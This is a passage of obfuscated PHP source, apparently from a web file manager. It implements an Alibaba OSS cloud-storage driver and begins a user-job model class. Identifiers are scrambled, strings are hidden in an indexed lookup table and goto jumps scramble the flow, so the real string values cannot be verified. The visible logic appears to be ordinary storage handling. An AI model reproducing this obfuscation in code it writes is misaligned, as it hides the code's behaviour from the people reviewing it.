folderInfo($éËºóè, $ù½ê™® = false, $Š÷ı…í = array()) { $Ëö‡ö‰å =& $_SERVER[±³—úê]; $ê´¦ ä = array($Ëö‡ö‰å[32] => $this->pathThis($éËºóè), $Ëö‡ö‰å[87] => $this->getPathOuter($Ëö‡ö‰å[8] . $éËºóè), $Ëö‡ö‰å[33] => $Ëö‡ö‰å[78]); if ($ù½ê™®) { return $ê´¦ ä; } $ê´¦ ä[$Ëö‡ö‰å[243]] = $ê´¦ ä[$Ëö‡ö‰å[88]] = 0; $ê´¦ ä[$Ëö‡ö‰å[244]] = $ê´¦ ä[$Ëö‡ö‰å[245]] = !0; if (empty($Š÷ı…í)) { $éËºóè = rtrim($éËºóè, $Ëö‡ö‰å[8]) . $Ëö‡ö‰å[8]; $Å˜µóĞ­ = $this->objectMeta($éËºóè); if (!$Å˜µóĞ­) { return $ê´¦ ä; } $Š÷ı…í = array($Ëö‡ö‰å[243] => $Å˜µóĞ­[$Ëö‡ö‰å[586]][$Ëö‡ö‰å[1486]], $Ëö‡ö‰å[88] => strtotime($Å˜µóĞ­[$Ëö‡ö‰å[1483]])); } if (isset($Š÷ı…í[$Ëö‡ö‰å[88]])) { $ê´¦ ä[$Ëö‡ö‰å[88]] = $Š÷ı…í[$Ëö‡ö‰å[88]]; } if (isset($Š÷ı…í[$Ëö‡ö‰å[243]])) { $ê´¦ ä[$Ëö‡ö‰å[243]] = $Š÷ı…í[$Ëö‡ö‰å[243]]; } return $ê´¦ ä; } public function listPath($ã­àñ™¶, $¼º‘øÙŒ = false) { $÷ùïƒ²Å =& $_SERVER[±³—úê]; $°¹Œ˜÷Ë = $this->fileList($ã­àñ™¶, $÷ùïƒ²Å[8], !0); foreach ($°¹Œ˜÷Ë[$÷ùïƒ²Å[85]] as $§Ÿ†ÚÙú => $·–šš—ç) { $°¹Œ˜÷Ë[$÷ùïƒ²Å[85]][$§Ÿ†ÚÙú] = $this->folderInfo($·–šš—ç, $¼º‘øÙŒ, $·–šš—ç); } foreach ($°¹Œ˜÷Ë[$÷ùïƒ²Å[86]] as $§Ÿ†ÚÙú => $·–šš—ç) { $°¹Œ˜÷Ë[$÷ùïƒ²Å[86]][$§Ÿ†ÚÙú] = $this->fileInfo($·–šš—ç[$÷ùïƒ²Å[32]], $¼º‘øÙŒ, $·–šš—ç); } return $°¹Œ˜÷Ë; } protected function infoChildren($š¤şÇì, &$±”è…–§) { $Œëıˆ´— =& $_SERVER[±³—úê]; $éÆãÜ·Ï = $this->fileList($š¤şÇì, $Œëıˆ´—[12], !0); $±”è…–§[$Œëıˆ´—[81]] += count($éÆãÜ·Ï[$Œëıˆ´—[85]]); $±”è…–§[$Œëıˆ´—[80]] += count($éÆãÜ·Ï[$Œëıˆ´—[86]]); foreach ($éÆãÜ·Ï[$Œëıˆ´—[86]] as $”Äù¥¦) { if (!$”Äù¥¦ || !$”Äù¥¦[$Œëıˆ´—[79]]) { continue; } $±”è…–§[$Œëıˆ´—[79]] += $”Äù¥¦[$Œëıˆ´—[79]]; } } public function has($á±Ğá¯, $³—³È›‘ = false, $«üìÏŒ– = true) { $¦íı‰×Á =& $_SERVER[±³—úê]; $á±Ğá¯ = trim($á±Ğá¯, $¦íı‰×Á[8]); $á¢ßâ­ = empty($á±Ğá¯) && $á±Ğá¯ !== $¦íı‰×Á[240] ? $¦íı‰×Á[12] : $á±Ğá¯ . $¦íı‰×Á[8]; $Ù†ÈˆÕä = $¦íı‰×Á[12]; $¸„ÛÇú¾ = 500; $ œ¹Ç•â = $ğÜÛİ«® = 0; while (!0) { check_abort(); $ÄÕĞŒê¾ = array($¦íı‰×Á[1477] => $¦íı‰×Á[8], $¦íı‰×Á[1478] => $á¢ßâ­, $¦íı‰×Á[1479] => $¸„ÛÇú¾, $¦íı‰×Á[1480] => $Ù†ÈˆÕä); try { $èù¶×ä = $this->client->listObjects($this->bucket, $ÄÕĞŒê¾); } catch (OSS\Core\OssException $‚¾‡×¯º) { $this->writeLog(__FUNCTION__ . $¦íı‰×Á[214] . $‚¾‡×¯º->getMessage()); break; } $Ù†ÈˆÕä = $èù¶×ä->getNextMarker(); $‘ôöş»– = $èù¶×ä->getObjectList(); $˜«‘—¿ô = $èù¶×ä->getPrefixList(); if ($³—³È›‘) { if (count($‘ôöş»–) > 1 || count($‘ôöş»–) == 1 && $‘ôöş»–[0]->getKey() != $á¢ßâ­) { $ œ¹Ç•â += count($‘ôöş»–) - 1; } if (!empty($˜«‘—¿ô)) { $ğÜÛİ«® += count($˜«‘—¿ô); } if ($Ù†ÈˆÕä === $¦íı‰×Á[12]) { break; } continue; } if ($«üìÏŒ–) { if (!empty($‘ôöş»–)) { if (count($‘ôöş»–) > 1 || $‘ôöş»–[0]->getKey() != $á¢ßâ­) { return !0; } } } else { if (!empty($˜«‘—¿ô)) { return !0; } } if ($Ù†ÈˆÕä === $¦íı‰×Á[12]) { break; } } if ($³—³È›‘) { return array($¦íı‰×Á[251] => $ œ¹Ç•â, $¦íı‰×Á[252] => $ğÜÛİ«®); } return !1; } public function listAll($—‡ù¸‚) { $çÏİĞù„ =& $_SERVER[±³—úê]; $ìâˆ‹™ë = $this->fileList($—‡ù¸‚, $çÏİĞù„[12], !0); $ã¹Š Ï = array_to_keyvalue($ìâˆ‹™ë[$çÏİĞù„[86]], $çÏİĞù„[32]); foreach ($ìâˆ‹™ë[$çÏİĞù„[85]] as $Ã–ßÀÁ˜) { if (is_string($Ã–ßÀÁ˜)) { $ã¹Š Ï[$Ã–ßÀÁ˜] = array($çÏİĞù„[79] => 0); } } return $this->listAllFiles($—‡ù¸‚, $ã¹Š Ï); } public function canRead($ÖŞ®İèØ) { $ò²ûÕƒº =& $_SERVER[±³—úê]; $™ú©±³’ = $this->pathAcl($ÖŞ®İèØ); return $™ú©±³’ == $ò²ûÕƒº[1487] || $™ú©±³’ == $ò²ûÕƒº[633] ? !0 : !1; } public function canWrite($‹é·áÓ¤) { $½ó³†äú = $this->pathAcl($‹é·áÓ¤); return $½ó³†äú == $_SERVER[±³—úê][633] ? !0 : !1; } public function pathAcl($åÛıß¤æ) { $‹ÌŞ‹„º =& $_SERVER[±³—úê]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¶¯ç’Øò = $this->client->getObjectAcl($this->bucket, $this->pathEncode($åÛıß¤æ)); } catch (OSS\Core\OssException $’¾ˆ­½ê) { $this->writeLog(__FUNCTION__ . $‹ÌŞ‹„º[214] . $’¾ˆ­½ê->getMessage()); return !1; } $•ÆœÏÄ… = $¶¯ç’Øò == $‹ÌŞ‹„º[37] ? $this->bucketAcl : $¶¯ç’Øò; if ($•ÆœÏÄ… == $‹ÌŞ‹„º[1488]) { return $‹ÌŞ‹„º[1487]; } if ($•ÆœÏÄ… == $‹ÌŞ‹„º[1489]) { return $‹ÌŞ‹„º[633]; } return $•ÆœÏÄ…; } private function chmodPath($ªÑ–üò™, $ĞÁŞá¿ö = '') { $ëÍ¬Àõ£ =& $_SERVER[±³—úê]; $ôä«£µÈ = empty($ĞÁŞá¿ö) ? $ëÍ¬Àõ£[1489] : $ĞÁŞá¿ö; $şô•—Ğğ = array($ëÍ¬Àõ£[37], $ëÍ¬Àõ£[241], $ëÍ¬Àõ£[1488], $ëÍ¬Àõ£[1489]); if (!in_array($ôä«£µÈ, $şô•—Ğğ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ªÑ–üò™), $ôä«£µÈ); } catch (OSS\Core\OssException $Éˆúš£) { $this->writeLog(__FUNCTION__ . $ëÍ¬Àõ£[214] . $Éˆúš£->getMessage()); return !1; } return !0; } public function getContent($ÀŞâƒĞµ) { return $this->fileSubstr($ÀŞâƒĞµ, -1); } public function setContent($²Û×‹›’, $€–ğÅÛÉ = '') { $ŞÌ×¨ =& $_SERVER[±³—úê]; try { $ğª¢±Ø¥ = $this->trafficLimit($ŞÌ×¨[1490]); $¿õÕØ÷ú = $this->client->putObject($this->bucket, $this->pathEncode($²Û×‹›’), $€–ğÅÛÉ, $ğª¢±Ø¥); } catch (OSS\Core\OssException $³ÍÇüŞÅ) { $this->writeLog(__FUNCTION__ . $ŞÌ×¨[214] . $³ÍÇüŞÅ->getMessage()); return !1; } $ÙÅé¹ = array($ŞÌ×¨[1484] => trim($¿õÕØ÷ú[$ŞÌ×¨[1481]], $ŞÌ×¨[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($²Û×‹›’))); $this->updateObjMeta($²Û×‹›’, $ÙÅé¹); return isset($¿õÕØ÷ú[$ŞÌ×¨[1491]][$ŞÌ×¨[305]]) ? !0 : !1; } private function updateObjMeta($—Í¢ğÏé, $‡­ˆÈ™¼) { $—Í¢ğÏé = $this->pathEncode($—Í¢ğÏé); try { $óŞ²¹† = array(OSS\OssClient::OSS_HEADERS => $‡­ˆÈ™¼); $this->client->copyObject($this->bucket, $—Í¢ğÏé, $this->bucket, $—Í¢ğÏé, $óŞ²¹†); } catch (OSS\Core\OssException $ø—ö¨ ) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][214] . $ø—ö¨ ->getMessage()); return !1; } return !0; } public function upload($°ºÏ¿ûö, $›çØÙÔ, $ê Õ°µ‘ = false, $÷û±¡’  = REPEAT_REPLACE) { $ı”Ñèäƒ =& $_SERVER[±³—úê]; $×í·åŞé = trim($°ºÏ¿ûö, $ı”Ñèäƒ[8]); $Ãšá˜å¦ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ı”Ñèäƒ[1484] => @md5_file($›çØÙÔ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($°ºÏ¿ûö))); $Ãšá˜å¦ = $this->trafficLimit($ı”Ñèäƒ[1490], $Ãšá˜å¦); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($×í·åŞé), $›çØÙÔ, $Ãšá˜å¦); } catch (OSS\Core\OssException $Âü¹à‰‹) { $this->writeLog(__FUNCTION__ . $ı”Ñèäƒ[214] . $Âü¹à‰‹->getMessage()); return !1; } return $this->getPathOuter($°ºÏ¿ûö); } public function getHost() { $ĞªÓùñá =& $_SERVER[±³—úê]; $ÍâëÙé = explode($ĞªÓùñá[210], parent::getHost()); return $ÍâëÙé[0] . $ĞªÓùñá[210] . $this->bucket . $ĞªÓùñá[10] . $ÍâëÙé[1]; } public function uploadFormData($ğÜŠÄİÀ, $ŞÖá†øó = 3600) { $¶ªÊ•»Å =& $_SERVER[±³—úê]; if (!($…£­ø = $this->getHost())) { return !1; } $½ÁÂÌ» = $ŞÖá†øó; $˜Ê½¨¬è = date($¶ªÊ•»Å[1492], time() + $½ÁÂÌ»); $«çîÆÁ = new DateTime($˜Ê½¨¬è); $ê§æã¢× = $«çîÆÁ->format(DateTime::ISO8601); $Üšª©à = strpos($ê§æã¢×, $¶ªÊ•»Å[382]); $ê§æã¢× = substr($ê§æã¢×, 0, $Üšª©à) . $¶ªÊ•»Å[1493]; $ï›İ×îò = 1048576000 * 5; $»›ÍÁ‘ = $this->pathFather($ğÜŠÄİÀ); $íàÓ«•ù = array($¶ªÊ•»Å[274] => $ê§æã¢×, $¶ªÊ•»Å[277] => array(array($¶ªÊ•»Å[1494], 0, $ï›İ×îò), array($¶ªÊ•»Å[279], $¶ªÊ•»Å[280], $»›ÍÁ‘))); $™”ÕÙÒÑ = base64_encode(json_encode($íàÓ«•ù)); $ÍƒàÕû = base64_encode(hash_hmac($¶ªÊ•»Å[1414], $™”ÕÙÒÑ, $this->secret, !0)); $¬ßØ»‹“ = array($¶ªÊ•»Å[1495] => $this->accessKey, $¶ªÊ•»Å[289] => $™”ÕÙÒÑ, $¶ªÊ•»Å[282] => $¶ªÊ•»Å[273], $¶ªÊ•»Å[1496] => $ÍƒàÕû, $¶ªÊ•»Å[208] => $…£­ø); $¬ßØ»‹“ = $this->trafficLimit($¶ªÊ•»Å[1490], $¬ßØ»‹“, !0); return $¬ßØ»‹“; } public function uploadMultiData($ÆşÛ“¾, $‹ÜÍÀ´Í = 3600) { $®ş·Ú» =& $_SERVER[±³—úê]; if (!($ÏÌÛ™¥ = $this->getHost())) { return !1; } $âğéÆŠ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÆşÛ“¾)); return array($®ş·Ú»[293] => $âğéÆŠ, $®ş·Ú»[208] => $ÏÌÛ™¥ . $®ş·Ú»[8] . $this->pathEncode($ÆşÛ“¾), $®ş·Ú»[294] => gmdate($®ş·Ú»[1497]), $®ş·Ú»[97] => $ÆşÛ“¾); } public function uploadMultiAuth($­¡ŸøæÍ, $Õ‘İáË = array()) { if (isset($Õ‘İáË[$_SERVER[±³—úê][295]])) { return $this->uploadPartAuth($­¡ŸøæÍ, $Õ‘İáË); } return $this->uploadListAuth($­¡ŸøæÍ, $Õ‘İáË); } private function uploadPartAuth($ù«›’ô’, $×¦‡ê³ = array()) { $§òàÜŸ« =& $_SERVER[±³—úê]; $Ë«ô‹âñ = $×¦‡ê³[$§òàÜŸ«[97]]; $Ü®åÉ–… = $this->_getUploadAuth($Ë«ô‹âñ, $×¦‡ê³); $°úì§Ÿ— = array($§òàÜŸ«[297] => $Ü®åÉ–…[$§òàÜŸ«[297]], $§òàÜŸ«[294] => $Ü®åÉ–…[$§òàÜŸ«[294]]); if (isset($Ü®åÉ–…[$§òàÜŸ«[1498]])) { $°úì§Ÿ—[$§òàÜŸ«[1498]] = $Ü®åÉ–…[$§òàÜŸ«[1498]]; } return $°úì§Ÿ—; } private function uploadListAuth($òèµŸÎ«, $¾ÎÑû = array()) { $¯˜â  =& $_SERVER[±³—úê]; $èê­ÊÖ = $¾ÎÑû[$¯˜â [97]]; $ˆ‚ÓÙ²„ = $¾ÎÑû[$¯˜â [293]]; $É°’Ô†ü = $this->client->listParts($this->bucket, $this->pathEncode($èê­ÊÖ), $ˆ‚ÓÙ²„); $ßôÀî³± = $É°’Ô†ü->getListPart(); $øåé°í = array(); foreach ($ßôÀî³± as $í›éÙË) { $øåé°í[] = array($¯˜â [308] => $í›éÙË->getPartNumber(), $¯˜â [309] => trim($í›éÙË->getETag(), $¯˜â [121])); } if (!$øåé°í) { return !1; } $Šªæ½† = $this->_getUploadAuth($èê­ÊÖ, $¾ÎÑû); return array($¯˜â [297] => $Šªæ½†[$¯˜â [297]], $¯˜â [294] => $Šªæ½†[$¯˜â [294]], $¯˜â [300] => $øåé°í); } private function _getUploadAuth($åê÷Ö, $ğ¥–Ï†–) { $…É‘ş£Â =& $_SERVER[±³—úê]; $å°Ì‚ÅÕ = gmdate($…É‘ş£Â[1497]); $Ë¼›‰ıÉ = isset($ğ¥–Ï†–[$…É‘ş£Â[295]]) ? $…É‘ş£Â[265] : $…É‘ş£Â[299]; $òùüï×  = array_intersect_key($ğ¥–Ï†–, array_flip(array($…É‘ş£Â[295], $…É‘ş£Â[293]))); ksort($òùüï× ); $íÃŠ = $òùüï×  ? $…É‘ş£Â[76] . http_build_query($òùüï× , null, $…É‘ş£Â[296], PHP_QUERY_RFC3986) : $…É‘ş£Â[12]; $Ôí˜Ÿ¦ = array($Ë¼›‰ıÉ, $…É‘ş£Â[12], $…É‘ş£Â[123], $å°Ì‚ÅÕ, "\170\x2d\x6f\163\163\x2d\x64\141\x74\x65\72{$å°Ì‚ÅÕ}", $…É‘ş£Â[8] . $this->bucket . $…É‘ş£Â[8] . $åê÷Ö . $íÃŠ); if (isset($ğ¥–Ï†–[$…É‘ş£Â[295]])) { $­ƒîä½ = $this->trafficLimit($…É‘ş£Â[1490], array(), !0); if ($­ƒîä½) { $åê÷Ö = $…É‘ş£Â[1498]; array_splice($Ôí˜Ÿ¦, 5, 0, $åê÷Ö . $…É‘ş£Â[4] . $­ƒîä½[$åê÷Ö]); } } $ÇõîÅ“ = implode($…É‘ş£Â[221], $Ôí˜Ÿ¦); $´îÏ·Ç = base64_encode(hash_hmac($…É‘ş£Â[1414], $ÇõîÅ“, $this->secret, !0)); $Ëœ¾†îƒ = $…É‘ş£Â[1467] . $this->accessKey . $…É‘ş£Â[4] . $´îÏ·Ç; $Äöï—å = array($…É‘ş£Â[297] => $Ëœ¾†îƒ, $…É‘ş£Â[294] => $å°Ì‚ÅÕ); if (!empty($­ƒîä½)) { $Äöï—å = array_merge($Äöï—å, $­ƒîä½); } return $Äöï—å; } public function download($ÆşÄ™åß, $²§è‡õ) { $¤ûÍóê =& $_SERVER[±³—úê]; if ($this->isFolder($ÆşÄ™åß)) { return !1; } try { $ï½“ãèû = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $²§è‡õ); $ï½“ãèû = $this->trafficLimit($¤ûÍóê[112], $ï½“ãèû); $this->client->getObject($this->bucket, $this->pathEncode($ÆşÄ™åß), $ï½“ãèû); } catch (OSS\Core\OssException $¸ÄÄ”Ãî) { $this->writeLog(__FUNCTION__ . $¤ûÍóê[214] . $¸ÄÄ”Ãî->getMessage()); return !1; } return $²§è‡õ; } public function fileSubstr($À¡‚Õ, $º†À¨¯ = 0, $‚è£ËŠë = false) { if ($º†À¨¯ === -1) { $â¡¢ŞŒ¦ = array(); } else { if ($‚è£ËŠë === !1) { $ŒÀîÅÒ¡ = $this->size($À¡‚Õ); } else { $ŒÀîÅÒ¡ = $º†À¨¯ + $‚è£ËŠë - 1; } $â¡¢ŞŒ¦ = array(OSS\OssClient::OSS_RANGE => "{$º†À¨¯}\x2d{$ŒÀîÅÒ¡}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($À¡‚Õ), $â¡¢ŞŒ¦); } catch (OSS\Core\OssException $®‡„©Õã) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][214] . $®‡„©Õã->getMessage()); think_exception($®‡„©Õã->getMessage()); return !1; } } private function trafficLimit($Â˜­¬û’, $àÉÂ¢ÉÏ = array(), $Ì¾íúíï = false) { $àûú„şñ =& $_SERVER[±³—úê]; if ($Â˜­¬û’ == $àûú„şñ[1490] && $this->isUploadServer() || $Â˜­¬û’ == $àûú„şñ[112] && $this->isFileOutServer()) { return $àÉÂ¢ÉÏ; } $”º­›ë¡ = floatval($GLOBALS[$àûú„şñ[6]][$àûú„şñ[92]][$àûú„şñ[110]][$Â˜­¬û’]) * 1024 * 1024 * 8; if (!$”º­›ë¡) { return $àÉÂ¢ÉÏ; } $”º­›ë¡ = $”º­›ë¡ < 819200 ? 819200 : ($”º­›ë¡ > 838860800 ? 838860800 : $”º­›ë¡); if ($Ì¾íúíï) { $àÉÂ¢ÉÏ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($”º­›ë¡); } else { if (!isset($àÉÂ¢ÉÏ[OSS\OssClient::OSS_HEADERS])) { $àÉÂ¢ÉÏ[OSS\OssClient::OSS_HEADERS] = array(); } $àÉÂ¢ÉÏ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($”º­›ë¡); } return $àÉÂ¢ÉÏ; } public function link($˜¡ôÌÌÄ, $¼ö¼éşó = array()) { $á—°æí =& $_SERVER[±³—úê]; if (!$this->exist($˜¡ôÌÌÄ) || $this->isFolder($˜¡ôÌÌÄ)) { return !1; } try { $¼ö¼éşó = $this->trafficLimit($á—°æí[112], $¼ö¼éşó, !0); $ÄÃşØÖ¸ = $this->client->signUrl($this->bucket, $this->pathEncode($˜¡ôÌÌÄ), 3600 * 12, $á—°æí[1499], $¼ö¼éşó); return $this->getCdnLink($ÄÃşØÖ¸); } catch (OSS\Core\OssException $£´šŞº) { $this->writeLog(__FUNCTION__ . $á—°æí[214] . $£´šŞº->getMessage()); return !1; } } public function fileOut($üéÁ×‡³, $âİ•Ùºà = false, $ğœë¾Ê¦ = false, $ÎÕ¾£Ê¤ = '') { $÷åÉÑ˜ê =& $_SERVER[±³—úê]; if ($this->isFileOutServer()) { return $this->fileOutServer($üéÁ×‡³, $âİ•Ùºà, $ğœë¾Ê¦, $ÎÕ¾£Ê¤); } if (!$ğœë¾Ê¦) { $ğœë¾Ê¦ = $this->pathThis($üéÁ×‡³); } $ğœë¾Ê¦ = rawurlencode($ğœë¾Ê¦); $Ï¶¢Ù•Ï = get_file_mime(get_path_ext($ğœë¾Ê¦)); if ($Ï¶¢Ù•Ï == $÷åÉÑ˜ê[260]) { return parent::fileOut($üéÁ×‡³, $âİ•Ùºà, $ğœë¾Ê¦, $ÎÕ¾£Ê¤); } $âİ•Ùºà = $âİ•Ùºà ? $÷åÉÑ˜ê[1500] : $÷åÉÑ˜ê[1501]; $ ¢ŠÏ = array(OSS\OssClient::OSS_SUB_RESOURCE => $÷åÉÑ˜ê[1502] . rawurlencode("{$âİ•Ùºà}\73\146\x69\154\x65\x6e\x61\155\x65\x3d{$ğœë¾Ê¦}")); $ ¢ŠÏ[OSS\OssClient::OSS_SUB_RESOURCE] .= $÷åÉÑ˜ê[1503] . rawurlencode($Ï¶¢Ù•Ï); $îñ¶õæˆ = $this->link($üéÁ×‡³, $ ¢ŠÏ); $this->fileOutLink($îñ¶õæˆ); } public function fileOutServer($»ûıø­, $« „Ì± = false, $Ô€ïœØ = false, $´Ï÷ÑÚÖ = '') { parent::fileOut($»ûıø­, $« „Ì±, $Ô€ïœØ, $´Ï÷ÑÚÖ); } public function fileOutImage($Ê—Ï£µ·, $‘·½óÆ± = 250) { if ($this->size($Ê—Ï£µ·) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ê—Ï£µ·, $‘·½óÆ±); } $›ì›±ê = array(OSS\OssClient::OSS_PROCESS => $_SERVER[±³—úê][1463] . $‘·½óÆ±); $…é½ë = $this->link($Ê—Ï£µ·, $›ì›±ê); $this->fileOutLink($…é½ë); } public function fileOutImageServer($¸Ğ²Øİä, $ÉÅÆÛ«ì = 250) { parent::fileOutImage($¸Ğ²Øİä, $ÉÅÆÛ«ì); } public function fileOutLink($Ó·Ï„ˆğ) { $Úú»Ì° =& $_SERVER[±³—úê]; if (!$this->isCdnHost() && substr($Ó·Ï„ˆğ, 0, 7) == $Úú»Ì°[228]) { $Ó·Ï„ˆğ = $Úú»Ì°[229] . substr($Ó·Ï„ˆğ, 7); } header($Úú»Ì°[175] . $Ó·Ï„ˆğ); die; } public function hashMd5($ôµ«Ÿ¾¥, $åáªˆ´¢ = '') { $´·ı÷‘Ü =& $_SERVER[±³—úê]; $âö•ËÂ = $this->_objectMeta($ôµ«Ÿ¾¥); if (!$âö•ËÂ) { return $´·ı÷‘Ü[12]; } if (!isset($âö•ËÂ[$´·ı÷‘Ü[1484]]) && !empty($åáªˆ´¢)) { $Òš›‡» = $this->updateObjMeta($ôµ«Ÿ¾¥, array($´·ı÷‘Ü[1484] => $åáªˆ´¢)); $âö•ËÂ[$´·ı÷‘Ü[1484]] = $Òš›‡» ? $åáªˆ´¢ : $´·ı÷‘Ü[12]; } return isset($âö•ËÂ[$´·ı÷‘Ü[1484]]) ? strtolower($âö•ËÂ[$´·ı÷‘Ü[1484]]) : $´·ı÷‘Ü[12]; } public function size($ÂéÎï§ ) { $â³Å©¾Ø = $this->objectMeta($ÂéÎï§ ); return $â³Å©¾Ø ? $â³Å©¾Ø[$_SERVER[±³—úê][79]] : 0; } public function info($••˜‚») { if ($this->isFolder($••˜‚»)) { return $this->folderInfo($••˜‚»); } else { if ($this->isFile($••˜‚»)) { return $this->fileInfo($••˜‚»); } } return !1; } public function exist($ä“ôÊ›) { return $this->isFile($ä“ôÊ›) || $this->isFolder($ä“ôÊ›); } public function isFile($ØĞÄïå¿) { return !$this->isFolder($ØĞÄïå¿) && $this->objectMeta($ØĞÄïå¿); } public function isFolder($Ó¥ÓÜÄô) { return $this->cacheMethod($_SERVER[±³—úê][179], $Ó¥ÓÜÄô); } protected function objectMeta($Ö–µóá÷) { return $this->cacheMethod($_SERVER[±³—úê][181], $Ö–µóá÷); } protected function _objectMeta($Øõ³éŠ‚) { $á’¬µ®Ô =& $_SERVER[±³—úê]; try { $Äó îÁ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Øõ³éŠ‚)); } catch (OSS\Core\OssException $ã÷½Üù) { $this->writeLog(__FUNCTION__ . $á’¬µ®Ô[214] . $ã÷½Üù->getMessage()); $Äó îÁ = !1; } if ($Äó îÁ) { $Äó îÁ[$á’¬µ®Ô[79]] = intval($Äó îÁ[$á’¬µ®Ô[1482]]); } return $Äó îÁ; } protected function _isFolder($ÎÈóÚ») { $°×Ãéå– =& $_SERVER[±³—úê]; if ($ÎÈóÚ» == $°×Ãéå–[12] || $ÎÈóÚ» == $°×Ãéå–[8]) { return !0; } $àˆæ¼¢ê = array($°×Ãéå–[1477] => $°×Ãéå–[8], $°×Ãéå–[1478] => rtrim($ÎÈóÚ», $°×Ãéå–[8]) . $°×Ãéå–[8], $°×Ãéå–[1479] => 1, $°×Ãéå–[1480] => $°×Ãéå–[12]); $Áõ¾Èûó = $this->client->listObjects($this->bucket, $àˆæ¼¢ê); if ($Áõ¾Èûó->getObjectList() || $Áõ¾Èûó->getPrefixList()) { return !0; } return !1; } public function writeLog($ôåà·äú = '', $Óœ˜ò = false) { $£ÊäÒÑ¾ =& $_SERVER[±³—úê]; $¿ãÜä–ë = in_array(ACTION, array($£ÊäÒÑ¾[212], $£ÊäÒÑ¾[213])); if (!$¿ãÜä–ë && !GLOBAL_DEBUG) { return; } $ï”ƒğØ = 0; if (stripos($ôåà·äú, $£ÊäÒÑ¾[1504]) !== !1) { $ï”ƒğØ = 1; $¶•İÁ‡° = explode($£ÊäÒÑ¾[1505], $ôåà·äú); $ôåà·äú = !empty($¶•İÁ‡°[1]) ? $¶•İÁ‡°[1] : $ôåà·äú; } else { if (stripos($ôåà·äú, $£ÊäÒÑ¾[1506])) { $ï”ƒğØ = 2; $¶•İÁ‡° = explode($£ÊäÒÑ¾[1506], $ôåà·äú); $¶•İÁ‡° = explode($£ÊäÒÑ¾[4], $¶•İÁ‡°[0]); $ôåà·äú = !empty($¶•İÁ‡°[1]) ? $¶•İÁ‡°[1] : $ôåà·äú; } } if ($¿ãÜä–ë && I18n::getType() == $£ÊäÒÑ¾[1507]) { if ($ï”ƒğØ == 1) { $ôåà·äú = str_replace($£ÊäÒÑ¾[1508], $£ÊäÒÑ¾[1509], $ôåà·äú); } else { if ($ï”ƒğØ == 2) { $¶•İÁ‡° = explode($£ÊäÒÑ¾[214], $¶•İÁ‡°[0]); $‰œ‰•½Õ = isset($¶•İÁ‡°[1]) ? $¶•İÁ‡°[1] : $£ÊäÒÑ¾[12]; $Ü…Ó– = array($£ÊäÒÑ¾[1510] => $£ÊäÒÑ¾[1511], $£ÊäÒÑ¾[1512] => $£ÊäÒÑ¾[1513], $£ÊäÒÑ¾[1514] => $£ÊäÒÑ¾[1515], $£ÊäÒÑ¾[1516] => $£ÊäÒÑ¾[1517], $£ÊäÒÑ¾[1518] => $£ÊäÒÑ¾[1519], $£ÊäÒÑ¾[1520] => $£ÊäÒÑ¾[1521], $£ÊäÒÑ¾[1522] => $£ÊäÒÑ¾[1523], $£ÊäÒÑ¾[1524] => $£ÊäÒÑ¾[1525], $£ÊäÒÑ¾[1526] => $£ÊäÒÑ¾[1527], $£ÊäÒÑ¾[1528] => $£ÊäÒÑ¾[1529]); if (isset($Ü…Ó–[$‰œ‰•½Õ])) { $ôåà·äú = $Ü…Ó–[$‰œ‰•½Õ]; } } } if (stripos($ôåà·äú, $£ÊäÒÑ¾[1530])) { $ôåà·äú = $£ÊäÒÑ¾[1531]; } } if (!trim($ôåà·äú)) { return; } parent::writeLog(trim($ôåà·äú), $Óœ˜ò); } } goto B‰¥ã¤Ô¾; BÁ™œñ‚ó«: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\152\x6f\x62\114\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x64\x65\163\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\x6c\146\x4a\157\x62\114\151\163\x74"; public function listData($Ş Œˆí„ = false, $®áÙÍ’¬ = "\163\x6f\162\164", $Âê™ø = false) { return parent::listData($Ş Œˆí„, $®áÙÍ’¬, $Âê™ø); } public function remove($Ç˜¥èøÔ) { return parent::remove($Ç˜¥èøÔ); } public function add($ı‚‹şò¸) { $’¢±î“Ş =& $_SERVER[±³—úê]; if ($this->findByName($ı‚‹şò¸[$’¢±î“Ş[32]])) { return !1; } $ı‚‹şò¸[$’¢±î“Ş[1999]] = $this->getSort(); return parent::insert($ı‚‹şò¸); } private function getSort() { $ß×‹Â =& $_SERVER[±³—úê]; $¿¬ƒŠßË = parent::listData(); $Á‹¦›àÀ = array_to_keyvalue($¿¬ƒŠßË, $ß×‹Â[12], $ß×‹Â[1999]); return empty($Á‹¦›àÀ) ? 0 : max($Á‹¦›àÀ) + 1; } public function update($ßèŠÍ·¯, $©¯£¾–Š) { $ÙíÍˆ¯Û =& $_SERVER[±³—úê]; $ã—ß¹…” = parent::listData($ßèŠÍ·¯); $ıŒÍ©øß = $this->findByName($©¯£¾–Š[$ÙíÍˆ¯Û[32]]); if (!$ã—ß¹…” || $ıŒÍ©øß && $ıŒÍ©øß[$ÙíÍˆ¯Û[486]] != $ã—ß¹…”[$ÙíÍˆ¯Û[486]]) { return !1; } return parent::update($ßèŠÍ·¯, $©¯£¾–Š); } public function setUserJob($Ÿ°ï¦ä·, $¬ÇÃ†ı) { $Óê¿ÑæÍ =& $_SERVER[±³—úê]; if (!is_array($¬ÇÃ†ı)) { $¬ÇÃ†ı = array($¬ÇÃ†ı); } $µÏªÖ´ = parent::listData(); $¤Ÿ®½ç = array_to_keyvalue($µÏªÖ´, $Óê¿ÑæÍ[32]); $‹‚¤òõÀ = $Óê¿ÑæÍ[465]; foreach 